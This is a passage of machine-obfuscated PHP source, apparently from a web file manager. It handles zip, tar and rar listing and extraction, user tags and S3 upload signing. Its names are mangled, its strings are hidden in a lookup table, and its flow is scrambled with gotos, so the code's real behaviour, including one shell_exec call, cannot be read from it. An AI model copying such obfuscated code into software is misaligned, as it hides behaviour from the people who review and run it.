$_SERVER[õëù©û]; if (defined($fµ¯İğè[1850])) { return; } define($fµ¯İğè[1850], SDK_DIR . $fµ¯İğè[1851]); goto e¾Å¸¤ï ; e¾Å¸¤ï : define($fµ¯İğè[1852], TEMP_FILES); define($fµ¯İğè[1853], TEMP_FILES); define($fµ¯İğè[1854], $fµ¯İğè[1855]); goto Dâˆíëœ‹; a¸äÄ‘í·: require_once ARCHIVE_LIB . $fµ¯İğè[1861]; goto b‹ä·‹¢; b‹ä·‹¢: } static function checkIfType($A‘¦•²´¨¤, $e”­Å©Ö) { goto b”Ä‡ß²ºŸ; C»Á¾ƒ¥¤Ó: return $A¢±±²â¤Š; goto C¶£¤ßÈõ«; b”Ä‡ß²ºŸ: $cÃ¯“³†¬ =& $_SERVER[õëù©û]; self::init(); $D­ëñ‡”Î¹ = array($cÃ¯“³†¬[297] => array($cÃ¯“³†¬[297], $cÃ¯“³†¬[1862], $cÃ¯“³†¬[1863], $cÃ¯“³†¬[1864]), $cÃ¯“³†¬[1865] => array($cÃ¯“³†¬[1865], $cÃ¯“³†¬[1866], $cÃ¯“³†¬[1034], $cÃ¯“³†¬[1032]), $cÃ¯“³†¬[1036] => array($cÃ¯“³†¬[1036], $cÃ¯“³†¬[1867], $cÃ¯“³†¬[1868], $cÃ¯“³†¬[1869], $cÃ¯“³†¬[1870], $cÃ¯“³†¬[1871], $cÃ¯“³†¬[1872])); goto BöÕò²§ìó; BöÕò²§ìó: $A¢±±²â¤Š = in_array($A‘¦•²´¨¤, $D­ëñ‡”Î¹[$e”­Å©Ö]); if ($A¢±±²â¤Š && ($e”­Å©Ö == $cÃ¯“³†¬[297] || $e”­Å©Ö == $cÃ¯“³†¬[1865]) && (!function_exists($cÃ¯“³†¬[1873]) || !function_exists($cÃ¯“³†¬[1874]))) { show_tips($cÃ¯“³†¬[1875]); } if ($A¢±±²â¤Š && $e”­Å©Ö == $cÃ¯“³†¬[1036] && (!function_exists($cÃ¯“³†¬[1876]) || !strstr(shell_exec($cÃ¯“³†¬[1877]), $cÃ¯“³†¬[1878]))) { show_tips($cÃ¯“³†¬[1879]); } goto C»Á¾ƒ¥¤Ó; C¶£¤ßÈõ«: } static function listContent($D“ÖÍ½°, $cÅÄ¬ï›É = true) { $AÚÏ„¶°õ =& $_SERVER[õëù©û]; self::init(); $cÅâÃ¡êò¹ = !empty($GLOBALS[$AÚÏ„¶°õ[1040]]) ? $GLOBALS[$AÚÏ„¶°õ[1040]] : get_path_ext($D“ÖÍ½°); $B¶ÑÃ˜òğ = !1; if (self::checkIfType($cÅâÃ¡êò¹, $AÚÏ„¶°õ[1865])) { $fâ™²ëÖ— = PclTarList($D“ÖÍ½°, $cÅâÃ¡êò¹); $B¶ÑÃ˜òğ = array(); for ($EÊøöŸÁ“ª = 0; $EÊøöŸÁ“ª < count($fâ™²ëÖ—); $EÊøöŸÁ“ª++) { $CÏ®ÒŒ”Ş– = $fâ™²ëÖ—[$EÊøöŸÁ“ª]; if ($CÏ®ÒŒ”Ş–[$AÚÏ„¶°õ[1880]] == $AÚÏ„¶°õ[1881] || $CÏ®ÒŒ”Ş–[$AÚÏ„¶°õ[1880]] == $AÚÏ„¶°õ[1882]) { continue; } if ($cÅÄ¬ï›É) { $CÏ®ÒŒ”Ş–[$AÚÏ„¶°õ[1883]] = ltrim($CÏ®ÒŒ”Ş–[$AÚÏ„¶°õ[1883]], $AÚÏ„¶°õ[1138]); } if ($CÏ®ÒŒ”Ş–[$AÚÏ„¶°õ[1880]] == $AÚÏ„¶°õ[1884]) { $CÏ®ÒŒ”Ş–[$AÚÏ„¶°õ[76]] = !0; } else { $CÏ®ÒŒ”Ş–[$AÚÏ„¶°õ[76]] = !1; } $CÏ®ÒŒ”Ş–[$AÚÏ„¶°õ[1027]] = $EÊøöŸÁ“ª; $B¶ÑÃ˜òğ[] = $CÏ®ÒŒ”Ş–; } } else { if (self::checkIfType($cÅâÃ¡êò¹, $AÚÏ„¶°õ[1036])) { $Cç»òÙ»Ş = kodRarArchive::listContent($D“ÖÍ½°); if (!$Cç»òÙ»Ş[$AÚÏ„¶°õ[1023]]) { return $Cç»òÙ»Ş; } else { $B¶ÑÃ˜òğ = $Cç»òÙ»Ş[$AÚÏ„¶°õ[1025]]; } } else { if (kodZipArchive::support($AÚÏ„¶°õ[350])) { $B¶ÑÃ˜òğ = kodZipArchive::listContent($D“ÖÍ½°); } else { $e¹°Ä¿î¯ƒ = new PclZip($D“ÖÍ½°); $B¶ÑÃ˜òğ = $e¹°Ä¿î¯ƒ->listContent(); } } } if ($B¶ÑÃ˜òğ) { $f¬ç»¾‚Û = unzip_charset_get($B¶ÑÃ˜òğ); $cÅÄ¬ï›É = $cÅÄ¬ï›É && function_exists($AÚÏ„¶°õ[65]); for ($EÊøöŸÁ“ª = 0; $EÊøöŸÁ“ª < count($B¶ÑÃ˜òğ); $EÊøöŸÁ“ª++) { $B¶ÑÃ˜òğ[$EÊøöŸÁ“ª][$AÚÏ„¶°õ[1883]] = str_replace(array($AÚÏ„¶°õ[1063], $AÚÏ„¶°õ[1885]), $AÚÏ„¶°õ[757], $B¶ÑÃ˜òğ[$EÊøöŸÁ“ª][$AÚÏ„¶°õ[1883]]); if ($cÅÄ¬ï›É) { $B¶ÑÃ˜òğ[$EÊøöŸÁ“ª][$AÚÏ„¶°õ[1883]] = iconv_to($B¶ÑÃ˜òğ[$EÊøöŸÁ“ª][$AÚÏ„¶°õ[1883]], $f¬ç»¾‚Û, $AÚÏ„¶°õ[322]); unset($B¶ÑÃ˜òğ[$EÊøöŸÁ“ª][$AÚÏ„¶°õ[1886]]); } } return array($AÚÏ„¶°õ[1023] => !0, $AÚÏ„¶°õ[1025] => $B¶ÑÃ˜òğ); } else { return array($AÚÏ„¶°õ[1023] => !1, $AÚÏ„¶°õ[1025] => $B¶ÑÃ˜òğ); } } static function extract($b¥ËÇÆ ²Ã, $dÙ¡ˆèö, $bÀóÔĞ’‹Œ = "\x2d\61", &$fî¢ğ‰Œˆ = false) { goto b¬Ä±Ûƒ; e„««¢â: $eàéÒì¼Ú‹ = self::listContent($b¥ËÇÆ ²Ã, !1); if (!$eàéÒì¼Ú‹[$B‘ÚóÍ¼Ó„[1023]]) { return $eàéÒì¼Ú‹; } if ($bÀóÔĞ’‹Œ != $B‘ÚóÍ¼Ó„[1022]) { goto FŞò±Ÿå; cÕğ«ö„Ä±: if ($D‹óíŞËİ÷[$B‘ÚóÍ¼Ó„[76]]) { $d ¯ÉÈ—‰Í = rtrim($d ¯ÉÈ—‰Í, $B‘ÚóÍ¼Ó„[8]) . $B‘ÚóÍ¼Ó„[8]; $fî¢ğ‰Œˆ = array($fî¢ğ‰Œˆ); } $bßá–°¼ = str_replace($B‘ÚóÍ¼Ó„[93], $B‘ÚóÍ¼Ó„[8], $d ¯ÉÈ—‰Í); if (substr($bßá–°¼, -1) == $B‘ÚóÍ¼Ó„[8]) { if (!strstr(trim($bßá–°¼, $B‘ÚóÍ¼Ó„[8]), $B‘ÚóÍ¼Ó„[8])) { $dÙ¡ˆèö = $dÙ¡ˆèö . get_path_this($bßá–°¼) . $B‘ÚóÍ¼Ó„[8]; } } else { if ($c§Ö¼ËßŒ == $d ¯ÉÈ—‰Í) { $c§Ö¼ËßŒ = $B‘ÚóÍ¼Ó„[33]; } } goto B×ŒÀ¸†Œ‰; c”•¡’–İ: if ($GLOBALS[$B‘ÚóÍ¼Ó„[6]][$B‘ÚóÍ¼Ó„[1136]] != $B‘ÚóÍ¼Ó„[322]) { $d ¯ÉÈ—‰Í = unzip_pre_name($fî¢ğ‰Œˆ); } $c§Ö¼ËßŒ = get_path_father($fî¢ğ‰Œˆ); if ($c§Ö¼ËßŒ == $fî¢ğ‰Œˆ) { $c§Ö¼ËßŒ = $B‘ÚóÍ¼Ó„[33]; } goto cÕğ«ö„Ä±; FŞò±Ÿå: $D‹óíŞËİ÷ = self::fileIndex($eàéÒì¼Ú‹[$B‘ÚóÍ¼Ó„[1025]], $bÀóÔĞ’‹Œ); $fî¢ğ‰Œˆ = str_replace(array($B‘ÚóÍ¼Ó„[1063], $B‘ÚóÍ¼Ó„[1885]), $B‘ÚóÍ¼Ó„[70], $D‹óíŞËİ÷[$B‘ÚóÍ¼Ó„[1883]]); $d ¯ÉÈ—‰Í = $fî¢ğ‰Œˆ; goto c”•¡’–İ; B×ŒÀ¸†Œ‰: } goto Eò±ÄÀÅ‡ˆ; Eò±ÄÀÅ‡ˆ: if (self::checkIfType($FÓàÉçó·, $B‘ÚóÍ¼Ó„[1865])) { if ($bÀóÔĞ’‹Œ != $B‘ÚóÍ¼Ó„[1022]) { $d ¯ÉÈ—‰Í = unzip_pre_name($d ¯ÉÈ—‰Í); $c§Ö¼ËßŒ = unzip_pre_name($c§Ö¼ËßŒ); $fÂ‡¬õî¸‰ = PclTarExtractList($b¥ËÇÆ ²Ã, array($d ¯ÉÈ—‰Í), $dÙ¡ˆèö, $c§Ö¼ËßŒ, $FÓàÉçó·); } else { $fÂ‡¬õî¸‰ = PclTarExtract($b¥ËÇÆ ²Ã, $dÙ¡ˆèö, $B‘ÚóÍ¼Ó„[357], $FÓàÉçó·); } return array($B‘ÚóÍ¼Ó„[1023] => $fÂ‡¬õî¸‰, $B‘ÚóÍ¼Ó„[1025] => PclErrorString(!0)); } else { if (self::checkIfType($FÓàÉçó·, $B‘ÚóÍ¼Ó„[1036])) { return kodRarArchive::extract($b¥ËÇÆ ²Ã, $dÙ¡ˆèö, $FÓàÉçó·, $fî¢ğ‰Œˆ); } else { if (kodZipArchive::support($B‘ÚóÍ¼Ó„[1887])) { return kodZipArchive::extract($b¥ËÇÆ ²Ã, $dÙ¡ˆèö, $fî¢ğ‰Œˆ); } else { $C‡ª÷¿¿ŸØ = new PclZip($b¥ËÇÆ ²Ã); if ($bÀóÔĞ’‹Œ != $B‘ÚóÍ¼Ó„[1022]) { $fÂ‡¬õî¸‰ = $C‡ª÷¿¿ŸØ->extract(PCLZIP_OPT_PATH, $dÙ¡ˆèö, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $B‘ÚóÍ¼Ó„[1888], PCLZIP_OPT_BY_NAME, $D‹óíŞËİ÷[$B‘ÚóÍ¼Ó„[1883]], PCLZIP_OPT_REMOVE_PATH, $c§Ö¼ËßŒ, PCLZIP_OPT_REPLACE_NEWER); } else { $fÂ‡¬õî¸‰ = $C‡ª÷¿¿ŸØ->extract(PCLZIP_OPT_PATH, $dÙ¡ˆèö, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $B‘ÚóÍ¼Ó„[1888], PCLZIP_OPT_REPLACE_NEWER); } return array($B‘ÚóÍ¼Ó„[1023] => $fÂ‡¬õî¸‰, $B‘ÚóÍ¼Ó„[1025] => $C‡ª÷¿¿ŸØ->errorName(!0)); } } } return array($B‘ÚóÍ¼Ó„[1023] => !1, $B‘ÚóÍ¼Ó„[1025] => $B‘ÚóÍ¼Ó„[1889]); goto Cê‰¯Ø¼Á¯; b¬Ä±Ûƒ: $B‘ÚóÍ¼Ó„ =& $_SERVER[õëù©û]; self::init(); $FÓàÉçó· = !empty($GLOBALS[$B‘ÚóÍ¼Ó„[1040]]) ? $GLOBALS[$B‘ÚóÍ¼Ó„[1040]] : get_path_ext($b¥ËÇÆ ²Ã); goto e„««¢â; Cê‰¯Ø¼Á¯: } static function fileIndex($BßÑõÁäñÓ, $a¼£‡¯˜ë„, $B´ÂƒøîÃ = false) { goto D•°Éœ™Ô÷; D•°Éœ™Ô÷: $C‹„ªøŠÔ =& $_SERVER[õëù©û]; self::init(); if (!is_array($BßÑõÁäñÓ)) { return !1; } goto fß¦·»Úî×; Cëˆöù‰Ùƒ: $A‰Å¾ó‹³ = $bäÂğÚÜÂ•; if ($B´ÂƒøîÃ) { $A‰Å¾ó‹³ = $bäÂğÚÜÂ•[$B´ÂƒøîÃ]; if ($bäÂğÚÜÂ•[$C‹„ªøŠÔ[76]]) { $A‰Å¾ó‹³ = rtrim($A‰Å¾ó‹³, $C‹„ªøŠÔ[8]) . $C‹„ªøŠÔ[8]; } } return $A‰Å¾ó‹³; goto F¹îÔŠï…’; fß¦·»Úî×: $a­Ø—†– = count($BßÑõÁäñÓ); for ($D‚—¯íî’ì = 0; $D‚—¯íî’ì < $a­Ø—†–; $D‚—¯íî’ì++) { if ($a¼£‡¯˜ë„ == $BßÑõÁäñÓ[$D‚—¯íî’ì][$C‹„ªøŠÔ[1027]]) { $bäÂğÚÜÂ• = $BßÑõÁäñÓ[$D‚—¯íî’ì]; break; } } if (!$bäÂğÚÜÂ•) { show_tips($C‹„ªøŠÔ[1890]); } goto Cëˆöù‰Ùƒ; F¹îÔŠï…’: } static function extractZipFile($E‡ƒˆ‘µ š, $b´‘Í‡ª¥, $eÑôØ½›ƒ = false) { goto cÆîëëÖï‰; cÅÎ–…ğ³½: if (!file_exists($dÏö½™·­ó)) { return !1; } @rename($dÏö½™·­ó, $AÍ·˜¿¤¼); return $AÍ·˜¿¤¼; goto cóùœäµî; cÆîëëÖï‰: $B×ÈôÀ×Ô’ =& $_SERVER[õëù©û]; self::init(); $eœ†ä—²Ì = TEMP_FILES . hash_path($E‡ƒˆ‘µ š) . $B×ÈôÀ×Ô’[8]; goto Dâà®Âç«’; Dâà®Âç«’: mk_dir($eœ†ä—²Ì); $AÍ·˜¿¤¼ = $eœ†ä—²Ì . md5($E‡ƒˆ‘µ š . $b´‘Í‡ª¥); if ($eÑôØ½›ƒ) { $AÍ·˜¿¤¼ = $eœ†ä—²Ì . $eÑôØ½›ƒ; } goto AÖõ¹öîË; AÖõ¹öîË: if (file_exists($AÍ·˜¿¤¼)) { return $AÍ·˜¿¤¼; } $e“¯õ“±•ˆ = new PclZip($E‡ƒˆ‘µ š); $dÏö½™·­ó = unzip_filter_ext($eœ†ä—²Ì . get_path_this($b´‘Í‡ª¥)); goto EË“ù“œ†á; EË“ù“œ†á: $a–Í˜²Â¢ø = get_path_father($b´‘Í‡ª¥); if ($a–Í˜²Â¢ø == $b´‘Í‡ª¥) { $a–Í˜²Â¢ø = $B×ÈôÀ×Ô’[33]; } $fÎ¸¾Æ‡‘© = $e“¯õ“±•ˆ->extract(PCLZIP_OPT_PATH, $eœ†ä—²Ì, PCLZIP_CB_PRE_FILE_NAME, $B×ÈôÀ×Ô’[1888], PCLZIP_OPT_REMOVE_PATH, $a–Í˜²Â¢ø, PCLZIP_OPT_BY_NAME, $b´‘Í‡ª¥); goto cÅÎ–…ğ³½; cóùœäµî: } static function filePreview($eù¬²¦”Ç, $aÀê¥±Á¸Ş, $BÑçøöø” = false, $Aò×§«Äİµ = false) { goto B£ƒ¯÷›ÀÅ; C’ÏÀòŸ: if (!file_exists($cò˜‡ÄË‡Æ)) { del_dir($f®²Â…±’Í); show_json($a–×®ÂÇ–Ú[1893]); } IO::fileOut($cò˜‡ÄË‡Æ, $BÑçøöø”, $fõãî¹ç‰); goto CÊ•ÖÁ¶åŸ; B±¨ÔÅ”ø: if (!$c¤ÆÅˆ²[$a–×®ÂÇ–Ú[1023]]) { show_json($c¤ÆÅˆ²[$a–×®ÂÇ–Ú[1025]], !1); } if (!file_exists($A¾æ±Ğ±¿³)) { show_json($a–×®ÂÇ–Ú[1892], !1); } @rename($A¾æ±Ğ±¿³, $cò˜‡ÄË‡Æ); goto C’ÏÀòŸ; eàŠË Š—“: $c¤ÆÅˆ² = self::extract($eù¬²¦”Ç, $f®²Â…±’Í, $aÀê¥±Á¸Ş, $eĞ¬…¨Ò); if (is_array($eĞ¬…¨Ò)) { show_json($a–×®ÂÇ–Ú[1891], !1); } if (file_exists($cò˜‡ÄË‡Æ)) { IO::fileOut($cò˜‡ÄË‡Æ, $BÑçøöø”, get_path_this($eĞ¬…¨Ò)); return; } goto fÍäÔØğ†Ü; B£ƒ¯÷›ÀÅ: $a–×®ÂÇ–Ú =& $_SERVER[õëù©û]; self::init(); $f®²Â…±’Í = TEMP_FILES . hash_path($eù¬²¦”Ç) . $a–×®ÂÇ–Ú[8]; goto cˆ®‘İ›×¯; fÍäÔØğ†Ü: $eĞ¬…¨Ò = unzip_pre_name($eĞ¬…¨Ò); $fõãî¹ç‰ = get_path_this($eĞ¬…¨Ò); $A¾æ±Ğ±¿³ = unzip_filter_ext($f®²Â…±’Í . $fõãî¹ç‰); goto B±¨ÔÅ”ø; cˆ®‘İ›×¯: mk_dir($f®²Â…±’Í); $cò˜‡ÄË‡Æ = $f®²Â…±’Í . md5($eù¬²¦”Ç . $aÀê¥±Á¸Ş . $Aò×§«Äİµ); $eĞ¬…¨Ò = $a–×®ÂÇ–Ú[33]; goto eàŠË Š—“; CÊ•ÖÁ¶åŸ: } static function create($f¼³«§ªø, $eÂÕñ«øÆ­) { $eÃ¦•å‹ßÎ =& $_SERVER[õëù©û]; self::init(); $FÊ‘‡ŞÑ• = get_path_ext($f¼³«§ªø); $EìŒÑ‹¡å = !1; if (self::checkIfType($FÊ‘‡ŞÑ•, $eÃ¦•å‹ßÎ[297])) { if (kodZipArchive::support($eÃ¦•å‹ßÎ[1001])) { return kodZipArchive::create($f¼³«§ªø, $eÂÕñ«øÆ­); } $F•×ƒÔÄ± = new PclZip($f¼³«§ªø); foreach ($eÂÕñ«øÆ­ as $B­÷àåæ† => $d¦‚Ñ™†Ôã) { $d¦‚Ñ™†Ôã = str_replace($eÃ¦•å‹ßÎ[462], $eÃ¦•å‹ßÎ[8], $d¦‚Ñ™†Ôã); $f—ÓÌå«Â = Kodio::clear(get_path_father($d¦‚Ñ™†Ôã)); if ($B­÷àåæ† == 0) { $EìŒÑ‹¡å = $F•×ƒÔÄ±->create($d¦‚Ñ™†Ôã, PCLZIP_OPT_REMOVE_PATH, $f—ÓÌå«Â, PCLZIP_CB_PRE_FILE_NAME, $eÃ¦•å‹ßÎ[1894]); continue; } $EìŒÑ‹¡å = $F•×ƒÔÄ±->add($d¦‚Ñ™†Ôã, PCLZIP_OPT_REMOVE_PATH, $f—ÓÌå«Â, PCLZIP_CB_PRE_FILE_NAME, $eÃ¦•å‹ßÎ[1894]); } } else { if (self::checkIfType($FÊ‘‡ŞÑ•, $eÃ¦•å‹ßÎ[1865])) { foreach ($eÂÕñ«øÆ­ as $B­÷àåæ† => $d¦‚Ñ™†Ôã) { $d¦‚Ñ™†Ôã = str_replace($eÃ¦•å‹ßÎ[462], $eÃ¦•å‹ßÎ[8], $d¦‚Ñ™†Ôã); $f—ÓÌå«Â = Kodio::clear(get_path_father($d¦‚Ñ™†Ôã)); if ($B­÷àåæ† == 0) { $EìŒÑ‹¡å = PclTarCreate($f¼³«§ªø, array($d¦‚Ñ™†Ôã), $FÊ‘‡ŞÑ•, null, $f—ÓÌå«Â); continue; } $EìŒÑ‹¡å = PclTarAddList($f¼³«§ªø, array($d¦‚Ñ™†Ôã), $eÃ¦•å‹ßÎ[33], $f—ÓÌå«Â, $FÊ‘‡ŞÑ•); } } } return $EìŒÑ‹¡å; } } goto F²¥¤‰èŒ•; b‚ƒ¤ˆ¦àÎ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\141\147\114\x69\163\x74"; public $modelType = "\125\163\145\x72\x4f\160\164\x69\157\156"; public $field = array("\156\x61\155\x65", "\163\164\x79\154\x65", "\163\x6f\162\164"); public function listData($A“Ÿè®°¹ = false, $FÌ¾Ûœ‹½Å = "\x73\157\x72\x74", $e¢İ¯×èİ· = false) { return parent::listData($A“Ÿè®°¹, $FÌ¾Ûœ‹½Å, $e¢İ¯×èİ·); } public function remove($FŒŠ„Òè©Ú) { return parent::remove($FŒŠ„Òè©Ú); } public function add($A–„°ÇÓÙ‡, $BÍ«“ò—• = "\x6c\141\142\145\x6c\x2d\147\x72\x65\x79\55\x6e\157\x72\x6d\x61\154") { $aÔ‚Ë÷Šğˆ =& $_SERVER[õëù©û]; if ($this->findByName($A–„°ÇÓÙ‡)) { return !1; } $Eø¾ª¬Šì¹ = array($aÔ‚Ë÷Šğˆ[382] => $A–„°ÇÓÙ‡, $aÔ‚Ë÷Šğˆ[432] => $BÍ«“ò—•, $aÔ‚Ë÷Šğˆ[2072] => $this->getSort($aÔ‚Ë÷Šğˆ[242]) + 1); return parent::insert($Eø¾ª¬Šì¹); } public function update($BÏ‰ó›Ş, $dÔ™Ù†íêÓ) { $a‘Ü’Ê‡Ë‡ =& $_SERVER[õëù©û]; $CÙ×°Ÿç¼Ò = $this->listData($BÏ‰ó›Ş); $D•Ö‰ÙÚè¶ = $this->findByName($dÔ™Ù†íêÓ[$a‘Ü’Ê‡Ë‡[28]]); if (!$CÙ×°Ÿç¼Ò || $D•Ö‰ÙÚè¶ && $D•Ö‰ÙÚè¶[$a‘Ü’Ê‡Ë‡[363]] != $CÙ×°Ÿç¼Ò[$a‘Ü’Ê‡Ë‡[363]]) { return !1; } return parent::update($BÏ‰ó›Ş, $dÔ™Ù†íêÓ); } public function moveTop($A£¡——·Ìï) { $aíÛğ…ßƒ¸ =& $_SERVER[õëù©û]; $BË²öˆÛ¬ö = parent::listData(); $fˆ’õô¡İ = $this->getSort($aíÛğ…ßƒ¸[241]); foreach ($BË²öˆÛ¬ö as &$fšÒ‚×Ğ›å) { if ($fšÒ‚×Ğ›å[$aíÛğ…ßƒ¸[363]] == $A£¡——·Ìï) { $fšÒ‚×Ğ›å[$aíÛğ…ßƒ¸[2089]] = $fˆ’õô¡İ; continue; } $fšÒ‚×Ğ›å[$aíÛğ…ßƒ¸[2089]] += 1; } return parent::resetData($BË²öˆÛ¬ö); } public function moveBottom($E‡ğ”ÈÈÑ…) { $DÉà†Õ´«„ =& $_SERVER[õëù©û]; $F™’ğ²ÆìÕ = $this->getSort($DÉà†Õ´«„[242]) + 1; return parent::update($E‡ğ”ÈÈÑ…, array($DÉà†Õ´«„[2089] => $F™’ğ²ÆìÕ)); } public function resetSort($eæø¸Ã‡ÓŒ) { goto C³óÂßÛÍó; C³óÂßÛÍó: $d®š‘Êò =& $_SERVER[õëù©û]; $CÌ“ó©½ï = array(); $eæø¸Ã‡ÓŒ = is_array($eæø¸Ã‡ÓŒ) ? $eæø¸Ã‡ÓŒ : array(); goto DĞ™Ä†È©Ó; DĞ™Ä†È©Ó: for ($bÛÕˆÄÈ¡ = 0; $bÛÕˆÄÈ¡ < count($eæø¸Ã‡ÓŒ); $bÛÕˆÄÈ¡++) { $CÌ“ó©½ï[$eæø¸Ã‡ÓŒ[$bÛÕˆÄÈ¡] . $d®š‘Êò[33]] = $bÛÕˆÄÈ¡ + 1; } $C…¤«–Ÿ±÷ = parent::listData(); foreach ($C…¤«–Ÿ±÷ as &$f´æÎ×¯Úä) { $Dò¢ÀÊ»Ä = $CÌ“ó©½ï[$f´æÎ×¯Úä[$d®š‘Êò[363]]]; $f´æÎ×¯Úä[$d®š‘Êò[2089]] = $Dò¢ÀÊ»Ä ? $Dò¢ÀÊ»Ä : $f´æÎ×¯Úä[$d®š‘Êò[2089]]; } goto d˜‹Ê°•ºÅ; d˜‹Ê°•ºÅ: return parent::resetData($C…¤«–Ÿ±÷); goto Eœˆîôà‚; Eœˆîôà‚: } private function getSort($fËÂ·ÖÊ¼) { $D¸ÖèÉ‹ğÕ =& $_SERVER[õëù©û]; $EÉŠ°×µ  = parent::listData(); $b‘ïäëÁèÉ = array_to_keyvalue($EÉŠ°×µ , $D¸ÖèÉ‹ğÕ[33], $D¸ÖèÉ‹ğÕ[2089]); if (!$b‘ïäëÁèÉ) { $b‘ïäëÁèÉ = array(0); } $C¹¸˜ñ¶ = $fËÂ·ÖÊ¼ == $D¸ÖèÉ‹ğÕ[242] ? max($b‘ïäëÁèÉ) : min($b‘ïäëÁèÉ); return intval($C¹¸˜ñ¶); } } goto d”£ÜŒ¦¹Ä; BŒŒ¼‹¨ù•: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($DÜ¯ĞØÜÌÏ) { parent::__construct($DÜ¯ĞØÜÌÏ); } public function uploadFormData($BÇ³à’ÀßĞ, $côŠÆŒª¦ù = 3600) { goto e‚½Ã’íÁ; EÜª†¨„»: $A‚ä‰ƒë£ = hash_hmac($cÙ´ßÈÔƒ‡[1127], $aßÑœÇâ–, $F¾ğ×èåÓö, !0); $aÒÒ÷…Ó¬ = hash_hmac($cÙ´ßÈÔƒ‡[1127], $fÖŒƒÀÆ˜Ä, $A‚ä‰ƒë£, !0); $cŒ—ÙËêƒ = hash_hmac($cÙ´ßÈÔƒ‡[1127], $dª›ã‚Õ®™, $aÒÒ÷…Ó¬); goto aÎÖ‘Ü’ä¯; Fİ˜ãƒ…“: $dª›ã‚Õ®™ = base64_encode(json_encode($CŞÔŒŒ¬Ã»)); $fÎ¿Ï¯Ìà” = hash_hmac($cÙ´ßÈÔƒ‡[1127], $cÆŸ«›÷·½, $cÙ´ßÈÔƒ‡[1128] . $this->secret, !0); $F¾ğ×èåÓö = hash_hmac($cÙ´ßÈÔƒ‡[1127], $this->region, $fÎ¿Ï¯Ìà”, !0); goto EÜª†¨„»; DÂ›´àĞÃ–: $aßÑœÇâ– = $cÙ´ßÈÔƒ‡[59]; $d¥“Á„³—¨ = gmdate($cÙ´ßÈÔƒ‡[1118]); $cÆŸ«›÷·½ = gmdate($cÙ´ßÈÔƒ‡[685]); goto Còß¹–•ƒ¬; c‚¨Æ¾ÅÀ: $F‹Ûî¥øŠ = array($this->accessKey, $cÆŸ«›÷·½, $this->region, $aßÑœÇâ–, $fÖŒƒÀÆ˜Ä); $fÏÑâÕÀêâ = implode($cÙ´ßÈÔƒ‡[8], $F‹Ûî¥øŠ); $CŞÔŒŒ¬Ã» = array($cÙ´ßÈÔƒ‡[1086] => gmdate($cÙ´ßÈÔƒ‡[1085], strtotime($cÙ´ßÈÔƒ‡[1120])), $cÙ´ßÈÔƒ‡[1087] => array(array($cÙ´ßÈÔƒ‡[1089] => $this->bucket), array($cÙ´ßÈÔƒ‡[1088] => $AÉàŠÑÖæò), array($cÙ´ßÈÔƒ‡[1090], $cÙ´ßÈÔƒ‡[1091], $cÙ´ßÈÔƒ‡[33]), array($cÙ´ßÈÔƒ‡[1090], $cÙ´ßÈÔƒ‡[1121], $cÙ´ßÈÔƒ‡[33]), array($cÙ´ßÈÔƒ‡[1090], $cÙ´ßÈÔƒ‡[1122], $cÙ´ßÈÔƒ‡[33]), array($cÙ´ßÈÔƒ‡[1092] => $d±Ğ½‡…¢•), array($cÙ´ßÈÔƒ‡[1123] => $fÏÑâÕÀêâ), array($cÙ´ßÈÔƒ‡[1124] => $dŞÅæ‹Úïë), array($cÙ´ßÈÔƒ‡[1125] => $d¥“Á„³—¨), array($cÙ´ßÈÔƒ‡[1126] => $bòáÕìÍÏ))); goto Fİ˜ãƒ…“; aÎÖ‘Ü’ä¯: $F¿Á‡µŸ”Ê = array($cÙ´ßÈÔƒ‡[195] => $cÙ´ßÈÔƒ‡[33], $cÙ´ßÈÔƒ‡[1129] => $cÙ´ßÈÔƒ‡[33], $cÙ´ßÈÔƒ‡[1088] => $AÉàŠÑÖæò, $cÙ´ßÈÔƒ‡[1092] => $d±Ğ½‡…¢•, $cÙ´ßÈÔƒ‡[1096] => $dª›ã‚Õ®™, $cÙ´ßÈÔƒ‡[1130] => $fÏÑâÕÀêâ, $cÙ´ßÈÔƒ‡[1131] => $dŞÅæ‹Úïë, $cÙ´ßÈÔƒ‡[1132] => $d¥“Á„³—¨, $cÙ´ßÈÔƒ‡[1133] => $bòáÕìÍÏ, $cÙ´ßÈÔƒ‡[1134] => $cŒ—ÙËêƒ, $cÙ´ßÈÔƒ‡[165] => $this->getHost()); return $F¿Á‡µŸ”Ê; goto cã¢ù‹Õ˜; Còß¹–•ƒ¬: $fÖŒƒÀÆ˜Ä = $cÙ´ßÈÔƒ‡[1119]; $bòáÕìÍÏ = $côŠÆŒª¦ù . $cÙ´ßÈÔƒ‡[33]; $d±Ğ½‡…¢• = $cÙ´ßÈÔƒ‡[1084]; goto c‚¨Æ¾ÅÀ; e‚½Ã’íÁ: $cÙ´ßÈÔƒ‡ =& $_SERVER[õëù©û]; $AÉàŠÑÖæò = $cÙ´ßÈÔƒ‡[181]; $dŞÅæ‹Úïë = $cÙ´ßÈÔƒ‡[1117]; goto DÂ›´àĞÃ–; cã¢ù‹Õ˜: } public function multiUploadFormData($b³µ·ôİÕ£, $A»Ò÷Ú£¸ä = 3600) { $aÚĞÓ²ã—· =& $_SERVER[õëù©û]; $B¡ˆ¯À·ˆƒ = gmdate($aÚĞÓ²ã—·[1213]); $DÊ÷´–Å = array(); $bø‰îš‘Ì = $this->client->getUploadId($this->bucket, $b³µ·ôİÕ£, $DÊ÷´–Å); if (!$bø‰îš‘Ì) { return !1; } return array($aÚĞÓ²ã—·[205] => $bø‰îš‘Ì, $aÚĞÓ²ã—·[165] => $this->getHost() . $aÚĞÓ²ã—·[8] . $this->pathEncode($b³µ·ôİÕ£), $aÚĞÓ²ã—·[206] => $B¡ˆ¯À·ˆƒ, $aÚĞÓ²ã—·[89] => $b³µ·ôİÕ£); } public function multiUploadAuthData($C»Á‚È»…¹, $E¹´÷ªò© = array()) { goto B´µ¢´š”É; C©³ØÌ¡”â: $CÍÃ•†µ = $aÕîÒ‹Íç[210]; $aˆ‚Ø´è’ = $aÕîÒ‹Íç[8] . $this->pathEncode($b“ä×‰ïÄ) . $c±ƒÎ¤Ù; $eï¤Œ–»»™ = $this->client->__getSignatureV4($b£¾ŠÉŞæ, $a½¥¯¼å†«, $CÍÃ•†µ, $aˆ‚Ø´è’); goto CÈ“Í´’ÜĞ; CÈ“Í´’ÜĞ: if (strpos($c±ƒÎ¤Ù, 